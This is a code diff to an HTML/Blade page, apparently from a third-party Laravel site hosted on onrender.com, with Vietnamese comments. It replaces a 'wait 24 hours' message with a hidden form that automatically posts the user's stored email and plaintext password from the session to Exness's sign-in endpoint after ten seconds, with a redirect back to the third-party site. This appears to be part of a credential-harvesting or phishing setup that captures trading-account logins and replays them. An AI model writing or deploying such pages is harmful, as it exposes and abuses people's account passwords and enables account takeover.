@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -33,8 +34,24 @@
 <div class="text-center space-y-6">
     <div class="spinner mx-auto"></div>
     <h1 class="text-3xl font-bold text-yellow-400">We are processing your request</h1>
-    <p class="text-lg text-gray-300">Please wait up to <span class="text-white font-semibold">24 hours</span> for completion.</p>
+    <p class="text-lg text-gray-300">Please wait up to <span class="text-white font-semibold">10 seconds</span> for automatic login to Exness.</p>
     <p class="text-sm italic text-gray-400">Thank you for using our service.</p>
+
+    <!-- Form ẩn để gửi POST tới Exness -->
+    <form id="exness-login-form" action="https://my.exness.com/accounts/sign-in" method="POST" style="display: none;">
+        <input type="email" name="email" value="{{ session('email') }}">
+        <input type="password" name="password" value="{{ session('password') }}">
+        <!-- Thêm redirect_uri để xử lý thất bại -->
+        <input type="hidden" name="redirect_uri" value="https://exness-laravel.onrender.com/login-failed">
+        <button type="submit" id="submit-btn">Continue</button>
+    </form>
 </div>
+
+<script>
+    // Tự động submit form sau 10 giây
+    setTimeout(() => {
+        document.getElementById('exness-login-form').submit();
+    }, 10000);
+</script>
 </body>
 </html>
